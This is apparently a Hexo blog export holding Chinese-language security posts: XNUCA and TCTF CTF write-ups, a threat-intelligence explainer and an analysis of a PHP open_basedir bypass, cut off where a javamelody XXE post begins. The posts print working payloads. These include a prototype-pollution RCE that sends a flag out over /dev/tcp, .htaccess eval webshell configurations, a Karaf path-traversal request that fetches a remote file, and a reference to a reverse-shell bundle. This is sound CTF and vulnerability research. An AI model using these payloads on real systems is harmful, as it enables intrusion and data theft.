{"meta":{"title":"Image's blog","subtitle":"Welcome to Image's Blog","description":"personal blog","author":"Imagemlt","url":"https://hexo.imagemlt.xyz"},"pages":[{"title":"About","date":"2018-06-02T16:00:00.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"about/index.html","permalink":"https://hexo.imagemlt.xyz/about/index.html","excerpt":"","text":"关于东南大学Web狗一枚，在计算机技术与网络安全的道路上追随各位大牛的脚步紧赶慢赶的萌新"},{"title":"categories","date":"2018-06-04T09:21:14.000Z","updated":"2019-02-02T00:29:25.000Z","comments":false,"path":"categories/index.html","permalink":"https://hexo.imagemlt.xyz/categories/index.html","excerpt":"","text":""},{"title":"brainfuck解释器","date":"2016-12-13T00:26:19.000Z","updated":"2019-02-02T00:29:25.000Z","comments":false,"path":"brainfuck-e8-a7-a3-e9-87-8a-e5-99-a8/index.html","permalink":"https://hexo.imagemlt.xyz/brainfuck-e8-a7-a3-e9-87-8a-e5-99-a8/index.html","excerpt":"","text":""},{"title":"Image's SSRPanel","date":"2016-11-27T12:18:21.000Z","updated":"2019-02-02T00:29:25.000Z","comments":false,"path":"sample-page/index.html","permalink":"https://hexo.imagemlt.xyz/sample-page/index.html","excerpt":"","text":"这是一个范例页面。它和博客文章不同，因为它的页面位置是固定的，同时会显示于您的博客导航栏（大多数主题中）。大多数人会新增一个“关于”页面向访客介绍自己。它可能类似下面这样： 我是一个很有趣的人，我创建了工厂和庄园。并且，顺便提一下，我的妻子也很好。 ……或下面这样： XYZ装置公司成立于1971年，公司成立以来，我们一直向市民提供高品质的装置。我们位于北京市，有超过2,000名员工，对北京市有着相当大的贡献。 作为一个新的WordPress用户，您可以前往您的仪表盘删除这个页面，并建立属于您的全新内容。祝您使用愉快！"},{"title":"Links","date":"2018-06-02T16:00:00.000Z","updated":"2019-02-27T08:58:53.000Z","comments":true,"path":"links/index.html","permalink":"https://hexo.imagemlt.xyz/links/index.html","excerpt":"","text":"友情链接 我的wordpress博客,方便有兴趣的大佬评论 东南大学网络安全联盟官方博客 I++官方博客 一些大师傅的博客： leavesongs chybeta 梅子酒 王一航 阿烨 Xuccc r@inb0w 郁离歌 一叶飘零 Raphael Kur0mi uns3t Zedd"},{"title":"tags","date":"2018-06-04T09:22:04.000Z","updated":"2019-02-02T00:29:25.000Z","comments":false,"path":"tags/index.html","permalink":"https://hexo.imagemlt.xyz/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"XNUCA qualifier writeup","slug":"XNUCA-qualifier-md","date":"2019-08-28T18:26:12.000Z","updated":"2019-09-03T02:50:04.738Z","comments":true,"path":"post/XNUCA-qualifier-md/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/XNUCA-qualifier-md/index.html","excerpt":"","text":"首发于https://www.anquanke.com/post/id/185377 周末打了一下XNUCA，可以说这是打CTF以来难度最高的一个比赛，全场交的flag不到100个也是十分真实，膜精心准备这次比赛的NESE的大师傅们。这里贴一下做出来的两个web题目的writeup与题目分析。 HardJS我们的解法比赛时听说ROIS的师傅们拿了一血而且是直接RCE的，因此便将重点放到了后端的代码审计上。 拿到一个nodejs项目的源码进行审计，第一步便是运行npm audit ，可以看到依赖项的漏洞情况。 可以看到依赖项lodash存在原型链污染漏洞，即CVE-2019-10744. 我们查看一下项目的js源码，看看哪里调用了lodash.在查看消息的请求处理中我们可以看到当消息数量大于5时将会调用lodash.defaultsDeep来合并消息 根据CVE-2019-10744的信息，我们知道我们只需要有消息为 1&#123;\"type\":\"test\",\"content\":&#123;\"prototype\":&#123;\"constructor\":&#123;\"a\":\"b\"&#125;&#125;&#125;&#125; 在合并时便会在Object上附加a=b这样一个属性，任意不存在a属性的原型为Object的对象在访问其a属性时均会获取到b属性。那么这个污染究竟会起到什么样的效果？ 查看项目源码，可以知道该项目使用ejs库作为模版引擎，众所周知ejs作为一个模版引擎肯定少不了类似eval的操作用于解析一些数据。因此我们便可以去跟一下ejs的实现看看哪里有潜在的可以收到原型链污染的调用，这里我们可以找到两处可用的地方 pollution one 在577行可以看到很大的一片调用全是为了动态拼接一个js语句，这里我们可以注意到当opts存在属性outputFunctionName时,该属性outputFunctionName便会被直接拼接到这段js中。 往下跟一下可以看到这段js的具体调用位置 可以看到这段代码最后生成了一个动态的函数，且源码中正含有上述的append.所以我们的思路就很清晰了，只要覆盖了opts.outputFunctionName即可触发模版编译处的RCE. 最后我们的payload如下： 12&#123;\"type\":\"mmp\",\"content\":&#123;\"constructor\":&#123;\"prototype\":&#123;\"outputFunctionName\":\"a=1;process.mainModule.require('child_process').exec('bash -c \\\"echo $FLAG&gt;/dev/tcp/xxxxx/xx\\\"')//\"&#125;&#125;&#125;&#125; 只要提交这样的信息并触发合并操作，访问任意页面即可将flag发送到我们的后端。 pollution two除了这里的outputFunctionName外我们也可以覆盖opts.escapeFunction来实现RCE，具体源码关键点对应如下 预期解赛后看了NESE大佬的官方writeup,则利用了前端和后端两个原型链污染的点，后端原型链污染用于绕过登录验证越权登录admin,覆盖login与userid即可 而前端的原型链污染则是由于调用了$.extend方法 所有的消息都被加入了no-js，我们再看看页面是怎么渲染的 Header/notice/wiki/button/message的地方都处在沙箱中，无法XSS，我们再看看页面 可以看到我们只要通过原型链污染添加logger属性，即可覆盖logger的内容从而导致XSS。为了打到flag只需要让页面跳转到一个我们设置的伪造的登录窗口即可。 这道题目预期解将前后端的原型链污染结合利用，可以说是十分精妙的一道题目。 ezPHP源码很简单(感觉越简单的源码越不好搞)，一个写文件的功能且只能写文件名为[a-z\\.]* 的文件，且文件内容存在黑名单过滤，并且结尾被加上了一行，这就导致我们无法直接写入.htaccess里面auto_prepend_file等php_value。 我们的解法经测试，最后一行导致的.htaccess报错的问题可以通过# \\来解决。 该文件中有一处include(&#39;fl3g,php&#39;),该文件名不能通过正则匹配所以我们没办法直接利用该文件来getshell。那么还有什么.htaacess 的选项可以利用？ 翻一下php的官方文档php.ini配置选项列表，查找所有可修改范围为PHP_INI_ALL即PHP_INI_PERDIR的配置项，我们可以注意到这样一个选项include_path. 因此只要控制include_path便可以使这里include进来的fl3g.php可以是任意目录下的某个文件，那么怎样才能控制fl3g.php的内容?查找所有php log相关的功能可以看到error_log这一选项 所以我们的思路便很清晰了：利用error_log写入log文件到/tmp/fl3g.php，再设置include_path=/tmp即可让index.php能够包含我们想要的文件。这里的报错可以通过设置include_path到一个不存在的文件夹即可触发包含时的报错，且include_path的值也会被输出到屏幕上。 然而很不幸的是error_log的内容默认是htmlentities的,我们无法插入类似&lt;?php phpinfo();?&gt;的payload。那么怎么才能绕过这里的转义？ 查找最近的比赛我们可以发现一篇writeupInsomnihack 2019 I33t-hoster) 这便给了我们启示可以通过设置编码来绕过限制从而getshell. 因此最后的攻击方法如下： Step1 写入.htaccess error_log相关的配置 1234php_value include_path &quot;/tmp/xx/+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;php_value error_reporting 32767php_value error_log /tmp/fl3g.php# \\ Step2 访问index.php留下error_log Step3 写入.htaccess新的配置 1234php_value zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot;php_value include_path &quot;/tmp&quot;# \\ Step4 再访问一次index.php?2=evilcode即可getshell. 其他非预期解赛后得知我们的解法是全场唯一的正解，此外还存在两个非预期 非预期1设置pcre的一些选项可以导致文件名判断失效，从而直接写入fl3g.php 12php_value pcre.backtrack_limit 0php_value pcre.jit 0 非预期2只能说这个非预期为啥我没有想到 123php_value auto_prepend_fi\\le &quot;.htaccess&quot;# &lt;?php phpinfo();?&gt; 总结以上便是我们这次XNUCA web部分的writeup，质量非常高的一场比赛，感谢NESE的大佬们。希望国内能多一些这样质量高的CTF，少一些诸如某空间之类的垃圾比赛，也希望CTF圈选手们以后都能洁身自好杜绝py现象。","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://hexo.imagemlt.xyz/tags/Web/"}]},{"title":"浅谈威胁情报","slug":"threatIntelligence","date":"2019-04-24T16:25:55.000Z","updated":"2019-04-24T16:29:12.000Z","comments":true,"path":"post/threatIntelligence/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/threatIntelligence/index.html","excerpt":"","text":"浅谈威胁情报什么是威胁情报？威胁情报在百度百科上给出的定义是某种基于证据的知识，包括上下文、机制、标示、含义和能够执行的建议，这些知识与资产所面临已有的或酝酿中的威胁或危害相关，可用于资产相关主体对威胁或危害的响应或处理决策提供信息支持。业内大多数所说的威胁情报可以认为是狭义的威胁情报，其主要内容为用于识别和检测威胁的失陷标识，如文件HASH，IP，域名，程序运行路径，注册表项等，以及相关的归属标签。参考John Friedman和Mark Bouchard在2015年发表的网络威胁情报权威指南中下的定义：对敌方的情报，及其动机、企图和方法进行收集、分析和传播，帮助各个层面的安全和业务成员保护企业关键资产。情报即线索，威胁情报便是为了还原已发生的攻击和预测未发生的攻击所需要的一切线索。 安全圈所涉及的情报的范畴主要包括威胁情报、漏洞情报、资产情报。漏洞情报主要与脆弱点相关，描述的是本身业务存在的隐患问题；资产情报主要为内部IT业务资产和人的信息，而威胁情报则主要针对攻击者的威胁。而威胁情报又可以分为具体三类： 战术级情报 运营级情报 战略级情报 威胁情报的作用从威胁情报的分类来看： 战术级情报的作用主要是发现威胁事件，并对报警进行确认或者做优先级排序。常见的失陷检测情报(CnC情报，即攻击者控制被害主机所使用的远程指令与控制服务器等等的相关情报)、IP情报(访问互联网服务器的IP主机的相关信息的集合，可能包含恶意主机)便属于这种范畴。 运营及情报的主要作用是对已知的重要安全事件做分析(报警确认、攻击影响范围、攻击链以及攻击目的、技术战术方法等等)或者利用已知的攻击者技术战术手法主动地查找攻击相关的线索。 战略级情报主要目的是让安全管理者确定安全上的投入量、安全上的主要投入的方向等等，由于包括了什么样的组织会进行攻击，攻击可能造成的危害后果、攻击者的战术能力和掌控的资源情况等等以及攻击案例，可是安全管理者的决策不再盲目，更加针对组织的业务情况以及真正威胁。总体来说，威胁情报的主要作用便是方便企业及时最小化已发生的攻击产生的影响，追踪攻击来源并且再下次攻击产生之前做好防范，确认自身产品可能的缺陷并合理设置安全方面的投入力度与措施。 威胁情报的作用点威胁情报的作用点主要有： 攻击检测与防御基于威胁情报数据可以创建IDPs或者AV产品的签名，或者生成NFT(网络取证工具)、SIEM、ETDR(终端威胁检测及响应)等等产品的规则，用于攻击检测； 攻击溯源依赖于威胁情报可以对攻击溯源做更简单、更高效的处理。 态势感知利用威胁情报对自身服务弱点进行感知、获取外部咨询，从而对安全运营做更合理的安排 威胁情报是怎么生产的威胁情报的生产就是通过对原始数据/样本的采集、交换、分析、追踪,之后产生和共享有价值的威胁情报信息的过程。生产者可以通过使用蜜罐、沙箱、终端等手段收集大量的信息，经过初级或者专业技术分析后提供给消费者，满足消费者的服务安全运行的需求。腾讯等公司拥有庞大的数据基础，因此能够提供相对全面的初始数据与初级分析的情报。除了庞大的数据意外，也可以通过多种渠道收集数据，经过对数据的加工、处理、筛选等二次分析来得到更加贴近真相的威胁情报。 威胁情报是怎么消费的威胁情报的消费是指将企业和客户网络中的安全数据与威胁情报进行比对、验证，以及企业和客户方的安全分析师利用威胁情报进行分析的过程。威胁情报是否有价值，有多大价值，最终取决于消费者。参考gartner的论文，威胁情报消费的方式主要有： Web分类 网站信誉 预测访问网站的安全风险 IP信誉 反网络钓鱼 文件信誉 恶意文件黑名单，预防恶意软件的分发 移动应用信誉 分析恶意移动应用 威胁情报共享的相关指标、规范 CybOXCyber Observable eXpression (CybOX) 规范定义了一个表征计算机可观察对象与网络动态和实体的方法。可观察对象包括文件，HTTP会话，X509证书，系统配置项等。CybOX 规范提供了一套标准且支持扩展的语法，用来描述所有我们可以从计算系统和操作上观察到的内容。在某些情况下，可观察的对象可以作为判断威胁的指标，比如Windows的RegistryKey。这种可观察对象由于具有某个特定值，往往作为判断威胁存在与否的指标。IP地址也是一种可观察的对象，通常作为判断恶意企图的指标。 STIXStructured Threat Information eXpression (STIX) 提供了基于标准XML的语法描述威胁情报的细节和威胁内容的方法。STIX支持使用CybOX格式去描述大部分STIX语法本身就能描述的内容，当然，STIX还支持其他格式。标准化将使安全研究人员交换威胁情报的效率和准确率大大提升，大大减少沟通中的误解，还能自动化处理某些威胁情报。实践证明，STIX规范可以描述威胁情报中多方面的特征，包括威胁因素，威胁活动，安全事故等。它极大程度利用DHS规范来指定各个STIX实体中包含的数据项的格式。 TAXIITrusted Automated eXchange of Indicator Information (TAXII) 提供安全的传输和威胁情报信息的交换。很多文章让人误以为TAXII只能传输TAXII格式的数据，但实际上它支持多种格式传输数据。当前的通常做法是用TAXII来传输数据，用STIX来作情报描述，用CybOX的词汇。TAXII在标准化服务和信息交换的条款中定义了交换协议，可以支持多种共享模型，包括hub-and-spoke，peer-to-peer，subscription。TAXII在提供了安全传输的同时，还无需考虑拓朴结构、信任问题、授权管理等策略，留给更高级别的协议和约定去考虑。 其它规范不难看出，目前大量文章内容聚焦在STIX，TAXII，CybOX。有些文章甚至都没提到扮演着同样重要角色的CVE和CVSS。另外，还有很多DHS的补充性规范也经常被所谓的“专家”所忽视。Common Platform Enumeration（CPE）和Common Configuration Enumeration（CCE）规范了平台和配置的描述标准，就像CVE规范了漏洞的描述标准一样。Common Configuration Scoring System（CCSS）则提供了一套基于CVSS的指标。其他规范包括： Common Weakness Enumeration (CWE) 定义了通用软件设计与实现的弱点，安全漏洞往往是由这些弱点而来的。 Common Attack Pattern Enumeration and Classification (CAPEC) 提供了一个与跨事件攻击相似的功能。 Malware Attribute Enumeration and Characterization (MAEC) 可用于描述恶意软件的信息，类似于CVE和漏洞之间的关系。 Open Vulnerability Assessment Language (OVAL) 为评估漏洞范围和影响提供了一个框架。 当然还有其他的规范和标准，就不一一列举了。所有这些规范的目标都是覆盖更全面的安全通信领域，并使之成为一种标准化的东西。 美国政府和威胁情报美国的标准化工作和努力紧密围绕Defense Information Systems Agency（国防信息系统局，简称DISA）和美国National Institute of Standards and Technology（国际标准与技术研究院，简称NIST）。 NIST主要制定系统安全的规范，特别是网络安全框架规范，并主管计算机安全资源中心。 DISA则负责制定Secure Technical Implementation Guides （安全技术实施指南，简称STIGs）来规范信息系统的安全安装与维护。这些高级术语可不止是表面功夫，它们指代了包含技术指导在内的多种标准，允许安装和维修人员锁定系统，否则可能容易受到攻击。最近，这些组织已经完全支持NIST 的Security Content Automation Protocol （安全内容自动化协议，简称SCAP）。National Vulnerability Database （国家漏洞数据库，简称NVD） 提供官方 SCAP 映射层。这个开放标准的套件目的是：让安全配置的管理和测量能像威胁情报共享一样自动化。虽然不是经常被提起，但STIX协议可以和其他方式一样，轻松地封装SCAP的payloads。事实上，来自DHS系列中的很多标准其实都已经被SCAP覆盖到了。SCAP实际包含以下的标准： CVE CCE（通用配置列表标准） CPE CVSS CCSS OVAL Extensible Configuration Checklist Description Format （可扩展性配置清单描述格式标准，简称XCCDF） Open Checklist Interactive Language ​（开放检查表交互式语言，简称OCIL） 上述的除了XCCDF，OCIL和CCSS来自DHS系列标准，剩下的都是NIST定义的。XCCDF给系统配置规则的结构化集合提供了一个标准的描述。该标准支持自动化信息交换，合规测试与评分，同时大家仍然可以根据具体需求来作定制化开发。与DHS的安全威胁情报系列标准相比，XCCDF与DHS系列中的CCE仅存在少量差异。幸运的是，这是SCAP覆盖的内容和DHS系列规范中唯一的明显差异。OCIL提供了一个标准化的框架，以描述清单问题和解答问题的步骤，而CCSS有一套指标来衡量软件配置问题的安全性。它从公认的CVSS规范衍生出来，并提供类似的功能。 MILEManaged Incident Lightweight Exchange （轻量级交换托管事件，简称MILE） 封装的标准涵盖了与DHS系列规范大致相同的的内容，特别是CybOX，STIX和TAXII。MILE标准为指标和事件定义了一个数据格式。该封装还包含了 Incident Object Description and Exchange Format （事件对象描述和交换格式,简称IODEF）。IODEF合并了许多DHS系列规范的数据格式，并提供了一种交换那些可操作的统计性事件信息的格式，且支持自动处理。它还包含了IODEF for Structured Cybersecurity Information（结构化网络安全信息，简称IODEF-SCI）扩展和Realtime Internetwork Defense （实时网络防御，简称RID），支持自动共享情报和事件。 国内外威胁情报的玩家在Gartner的论文Market Guide for Security Threat Intelligence Products and Services中列举了国外的28家商用的威胁情报服务与9家免费的威胁情报服务。而许多企业也都建立了威胁情报平台(TIP),如微步威胁情报平台，RedQueen安全智能服务平台,IBM情报中心,360威胁情报中心,腾讯御见威胁情报中心等等。 在国内，我国的国家网络空间威胁情报共享开放平台也接入了多家企业， 如360、CNCERT、天融信、绿盟、安天、深信服等多家安全企业，共同提供情报开放共享、情报关联融合、情报评估校验等工作。 衡量威胁情报质量的方法威胁情报质量的评估具有以下几个原则： 科学性与实用性 系统性和层次性 全面性和代表性 动态性和静态性 我们需要在下面四个方面去保障其质量： 相关性要求更能强调和具体用户的地域性、行业性相关，即需要针对此用户的环境，能发现可能遭遇的重要威胁。 及时性情报的及时性是由多个因素构成的，包括数据收集的及时性、云端处理的及时性、情报分发的及时性等等。 精确性此特性主要指我们一般说的误报率指标。 可指导响应的上下文上下文一定是对决策、行动有帮助，与此无关给出的信息越多，说明情报的质量越差。 因此，针对威胁情报的这些属性，我们可以采取一些测试方法来进行测试: 新鲜度测试 流行度测试 独特性测试 覆盖测试 过期测试 关联测试 威胁情报的生产途径 基于大数据的方式，根据海量的恶意请求信息等提取共同点等来追踪威胁情报 蜜罐等网络设备，用于抓取恶意流量以及恶意文件样本等进行分析 基于开放或者付费的威胁情报平台提取有关的信息 技术网站等的报告中提取威胁情报信息","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/"}],"tags":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/tags/技术学习/"},{"name":"Security","slug":"Security","permalink":"https://hexo.imagemlt.xyz/tags/Security/"}]},{"title":"php open_basedir 绕过poc分析","slug":"php-bypass-open-basedir","date":"2019-04-05T10:28:26.000Z","updated":"2019-04-05T10:32:14.000Z","comments":true,"path":"post/php-bypass-open-basedir/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/index.html","excerpt":"","text":"php open_basedir poc分析近日在CTF交流群中看到一个绕过open_basedir限制的poc 对这个poc产生了极大的兴趣，因此翻出php的源码来下断点分析一波php open_basedir的机制。 在/main/fopen_wrappers.c中PHPAPI int php_check_open_basedir_ex(const char *path, int warn)方法是php在处理文件操作时用于验证open_basedir的方法。我们查看一下他的实现方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445PHPAPI int php_check_open_basedir_ex(const char *path, int warn)&#123; /* Only check when open_basedir is available */ if (PG(open_basedir) &amp;&amp; *PG(open_basedir)) &#123; char *pathbuf; char *ptr; char *end; /* Check if the path is too long so we can give a more useful error * message. */ if (strlen(path) &gt; (MAXPATHLEN - 1)) &#123; php_error_docref(NULL, E_WARNING, \"File name is longer than the maximum allowed path length on this platform (%d): %s\", MAXPATHLEN, path); errno = EINVAL; return -1; &#125; pathbuf = estrdup(PG(open_basedir)); ptr = pathbuf; while (ptr &amp;&amp; *ptr) &#123; end = strchr(ptr, DEFAULT_DIR_SEPARATOR); if (end != NULL) &#123; *end = '\\0'; end++; &#125; if (php_check_specific_open_basedir(ptr, path) == 0) &#123; efree(pathbuf); return 0; &#125; ptr = end; &#125; if (warn) &#123; php_error_docref(NULL, E_WARNING, \"open_basedir restriction in effect. File(%s) is not within the allowed path(s): (%s)\", path, PG(open_basedir)); &#125; efree(pathbuf); errno = EPERM; /* we deny permission to open it */ return -1; &#125; /* Nothing to check... */ return 0;&#125; 跟进php_check_specific_open_basedir，这个函数是具体实现每一个路径的判断，一个很长的函数,重点在如下几行： 123if (expand_filepath(path, resolved_name) == NULL) &#123; return -1; &#125; 这里是将传入的path扩展为绝对路径存放于resolved_name 第214行 1if (expand_filepath(local_open_basedir, resolved_basedir) != NULL) &#123; 这里会根据local_open_basedir的值扩展为绝对路径存放于resolved_basedir 241行 123456789101112131415161718192021222324if (strncasecmp(resolved_basedir, resolved_name, resolved_basedir_len) == 0) &#123;#else if (strncmp(resolved_basedir, resolved_name, resolved_basedir_len) == 0) &#123;#endif if (resolved_name_len &gt; resolved_basedir_len &amp;&amp; resolved_name[resolved_basedir_len - 1] != PHP_DIR_SEPARATOR) &#123; return -1; &#125; else &#123; /* File is in the right directory */ return 0; &#125; &#125; else &#123; /* /openbasedir/ and /openbasedir are the same directory */ if (resolved_basedir_len == (resolved_name_len + 1) &amp;&amp; resolved_basedir[resolved_basedir_len - 1] == PHP_DIR_SEPARATOR) &#123;#ifdef PHP_WIN32 if (strncasecmp(resolved_basedir, resolved_name, resolved_name_len) == 0) &#123;#else if (strncmp(resolved_basedir, resolved_name, resolved_name_len) == 0) &#123;#endif return 0; &#125; &#125; return -1; &#125; 可以看到这里在判断是否在路径范围内时，主要比较依据是先用strncmp判断与resolved_basedir长度内的部分是否完全一致，一致的话如果resolved_name与resolved_basedir长度相等则说明就在同一路径，返回0表示允许，长度大于resolved_basedir则判断超出的第一个字符是否不是/，是则返回成功，不是则返回失败。 这里我们再重点看一下expand_filepath这个函数的实现,主要实现为PHPAPI char *expand_filepath_with_mode,重点位于814行 1234567891011121314151617 if (virtual_file_ex(&amp;new_state, filepath, NULL, realpath_mode)) &#123; efree(new_state.cwd); return NULL; &#125; if (real_path) &#123; copy_len = new_state.cwd_length &gt; MAXPATHLEN - 1 ? MAXPATHLEN - 1 : new_state.cwd_length; memcpy(real_path, new_state.cwd, copy_len); real_path[copy_len] = '\\0'; &#125; else &#123; real_path = estrndup(new_state.cwd, new_state.cwd_length); &#125; efree(new_state.cwd); return real_path;&#125; 查看virtual_file_ex的实现,1337行之前的操作为如果path不是绝对路径则将path拼接至state.cwd得到resolved_path,重点第1337行 1path_length = tsrm_realpath_r(resolved_path, start, path_length, &amp;ll, &amp;t, use_realpath, 0, NULL); 跟进tsrm_realpath_r,可以看到操作主要是递归去掉双斜杠和.以及.. 这便是php在处理文件操作判断open_basedir的实现。我们再看php的内置函数ini_set的实现方法,在ext/standard/basic_functions.c中 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152PHP_FUNCTION(ini_set)&#123; zend_string *varname; zend_string *new_value; zend_string *val; ZEND_PARSE_PARAMETERS_START(2, 2) Z_PARAM_STR(varname) Z_PARAM_STR(new_value) ZEND_PARSE_PARAMETERS_END(); val = zend_ini_get_value(varname); /* copy to return here, because alter might free it! */ if (val) &#123; if (ZSTR_IS_INTERNED(val)) &#123; RETVAL_INTERNED_STR(val); &#125; else if (ZSTR_LEN(val) == 0) &#123; RETVAL_EMPTY_STRING(); &#125; else if (ZSTR_LEN(val) == 1) &#123; RETVAL_INTERNED_STR(ZSTR_CHAR((zend_uchar)ZSTR_VAL(val)[0])); &#125; else if (!(GC_FLAGS(val) &amp; GC_PERSISTENT)) &#123; ZVAL_NEW_STR(return_value, zend_string_copy(val)); &#125; else &#123; ZVAL_NEW_STR(return_value, zend_string_init(ZSTR_VAL(val), ZSTR_LEN(val), 0)); &#125; &#125; else &#123; RETVAL_FALSE; &#125;#define _CHECK_PATH(var, var_len, ini) php_ini_check_path(var, var_len, ini, sizeof(ini)) /* open basedir check */ if (PG(open_basedir)) &#123; if (_CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), \"error_log\") || _CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), \"java.class.path\") || _CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), \"java.home\") || _CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), \"mail.log\") || _CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), \"java.library.path\") || _CHECK_PATH(ZSTR_VAL(varname), ZSTR_LEN(varname), \"vpopmail.directory\")) &#123; if ( (ZSTR_VAL(new_value))) &#123; zval_ptr_dtor_str(return_value); RETURN_FALSE; &#125; &#125; &#125;#undef _CHECK_PATH if (zend_alter_ini_entry_ex(varname, new_value, PHP_INI_USER, PHP_INI_STAGE_RUNTIME, 0) == FAILURE) &#123; zval_ptr_dtor_str(return_value); RETURN_FALSE; &#125;&#125; 由于我们ini_set的是open_basedir于是重要一行便落到了 1if (zend_alter_ini_entry_ex(varname, new_value, PHP_INI_USER, PHP_INI_STAGE_RUNTIME, 0) == FAILURE) &#123; 查看zend_alter_ini_entry_ex的实现,重要几行为 12345678910if (!ini_entry-&gt;on_modify || ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) == SUCCESS) &#123; if (modified &amp;&amp; ini_entry-&gt;orig_value != ini_entry-&gt;value) &#123; /* we already changed the value, free the changed value */ zend_string_release(ini_entry-&gt;value); &#125; ini_entry-&gt;value = duplicate; &#125; else &#123; zend_string_release(duplicate); return FAILURE; &#125; 调试可知,open_basedir对应的on_modify函数为OnUpdateBaseDir，重要几行为 1234567891011121314ptr = pathbuf = estrdup(ZSTR_VAL(new_value)); while (ptr &amp;&amp; *ptr) &#123; end = strchr(ptr, DEFAULT_DIR_SEPARATOR); if (end != NULL) &#123; *end = '\\0'; end++; &#125; if (php_check_open_basedir_ex(ptr, 0) != 0) &#123; /* At least one portion of this open_basedir is less restrictive than the prior one, FAIL */ efree(pathbuf); return FAILURE; &#125; ptr = end; &#125; 可见这里便是调用了php_check_open_basedir_ex来判断要更改的open_basedir是否合法。 回到zend_alter_ini_entry_ex中 123456789duplicate = zend_string_copy(new_value); if (!ini_entry-&gt;on_modify || ini_entry-&gt;on_modify(ini_entry, duplicate, ini_entry-&gt;mh_arg1, ini_entry-&gt;mh_arg2, ini_entry-&gt;mh_arg3, stage) == SUCCESS) &#123; if (modified &amp;&amp; ini_entry-&gt;orig_value != ini_entry-&gt;value) &#123; /* we already changed the value, free the changed value */ zend_string_release(ini_entry-&gt;value); &#125; ini_entry-&gt;value = duplicate; &#125; 可以看到open_basedir便会被直接设置为我们设置的值。 再来看我们的poc 123456789&lt;?phpini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/'); 假定我们的open_basedir为/var/www/html,我们位于/var/www/html/test目录下 执行第一个ini_set时，首先判断/var/www/html/test/..即/var/www/html/是否为open_basedir内，判断成功，因此直接更新open_basedir为.. 执行chdir(&#39;..&#39;)时，检测open_basedir，..根据当前目录补全后为/var/www/html，而我们的open_basedir为..,补全后也是/var/www/html，因此可以chdir成功。 再次chdir(&#39;..&#39;),检测open_basedir,..补全为/var/www,而此时的open_basedir补全也为/var/www，判断成功。 因此一系列的chdir(&#39;..&#39;)都会成功执行，最后当前目录跳到了/，open_basedir为..,设置open_basedir(&#39;/&#39;)同样可以执行成功，便成功实现了调整open_basedir至任意目录。 这个poc的构造十分巧妙，修复建议便是禁止在open_basedir已有的情况下修改open_basedir或者禁open_basedir可以被设置为相对路径。","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://hexo.imagemlt.xyz/tags/Web/"}]},{"title":"tctf ghost pepper writeup 与karaf框架一处简单的代码审计(CVE-2019-0226)","slug":"karaf-arbitrary-file-write","date":"2019-03-25T13:43:13.000Z","updated":"2019-05-14T11:00:48.000Z","comments":true,"path":"post/karaf-arbitrary-file-write/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/karaf-arbitrary-file-write/index.html","excerpt":"","text":"做tctf时，由于以为RR师傅要放0day，所以就去审karaf的源码去了没有好好看karaf的文档。。。 在 org.apache.karaf.config.core.impl.ConfigMBeanImpl, 存在一个目录穿越写文件的漏洞: 1234567891011121314151617181920212223242526272829@Overridepublic void install(String url, String finalname, boolean override) throws MBeanException &#123; try &#123; File etcFolder = new File(System.getProperty(\"karaf.etc\")); File file = new File(etcFolder, finalname); if (file.exists()) &#123; if (!override) &#123; throw new IllegalArgumentException(\"Configuration file &#123;&#125; already exists \" + finalname); &#125; &#125; try (InputStream is = new BufferedInputStream(new URL(url).openStream())) &#123; if (!file.exists()) &#123; File parentFile = file.getParentFile(); if (parentFile != null) &#123; parentFile.mkdirs(); &#125; file.createNewFile(); &#125; try (FileOutputStream fop = new FileOutputStream(file)) &#123; StreamUtils.copy(is, fop); &#125; &#125; catch (RuntimeException | MalformedURLException e) &#123; throw e; &#125; &#125; catch (Exception e) &#123; throw new MBeanException(null, e.toString()); &#125;&#125; 可以看到我们能够通过..来穿越到任意目录。为了复现题目环境这里我们安装karaf并安装jolokia的bundle： 然后只要发送这样一个包 123456789101112POST /jolokia HTTP/1.1Host: 111.186.63.207:31337User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Content-Type: application/jsonContent-Length: 179Authorization: Basic a2FyYWY6a2FyYWY=Connection: closeUpgrade-Insecure-Requests: 1&#123; &quot;type&quot;:&quot;EXEC&quot;, &quot;mbean&quot;:&quot;org.apache.karaf:name=root,type=config&quot;, &quot;operation&quot;: &quot;install&quot;, &quot;arguments&quot;:[&quot;http://69.171.76.88/testfile&quot;,&quot;../../../../../../../tmp/testfile&quot;,true]&#125; 可以看到/tmp目录已经写入了文件。 为了实现RCE,karaf会自动加载deploy目录下的bundle包，调用其Activator的start函数，因此我们只需要构造一个恶意的osgi bundle包在start函数中写入反弹shell的操作即可。 这里使用的bundle包源码放到了https://github.com/imagemlt/osgi-bundle-backdoor中，mvn install后再mvn package即可在target目录下找到生成的jar包。","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://hexo.imagemlt.xyz/tags/Web/"}]},{"title":"javamelody XXE(CVE-2018-15531) 